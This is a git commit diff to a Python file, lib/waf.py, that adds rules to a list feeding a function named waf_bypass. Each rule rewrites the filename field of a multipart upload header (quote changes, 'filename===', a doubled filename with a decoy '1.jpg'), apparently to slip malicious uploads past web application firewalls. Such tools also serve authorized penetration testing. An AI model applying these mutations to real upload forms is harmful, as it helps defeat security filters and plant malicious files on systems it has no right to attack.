58c30ed5c95fff30fdd17daff5b369d6db5213ae
fatekey <nucfatekey@qq.com>
2022-03-09 10:54:19 +0800

    新增规则

--- lib/waf.py
+++ lib/waf.py
@@ -2,7 +2,12 @@ import re
 
 waf_rule_list = [
     ['单引号filename',r'filename="(.*)"',"filename='\g<1>'"],
+    ['单引号filename2',r'filename="(.*)"',"filename='\g<1>"],
     ['无包裹filename',r'filename="(.*)"','filename=\g<1>'],
+    ['filename===',r'filename=','filename==='],
+    ['双name',r'filename=','filename="1.jpg";filename='],
+    ['单引号name',r'filename=',"'filename'="],
+    ['双引号name',r'filename=','"filename"=']
 ]
 payload_list = []
 def waf_bypass(paste):
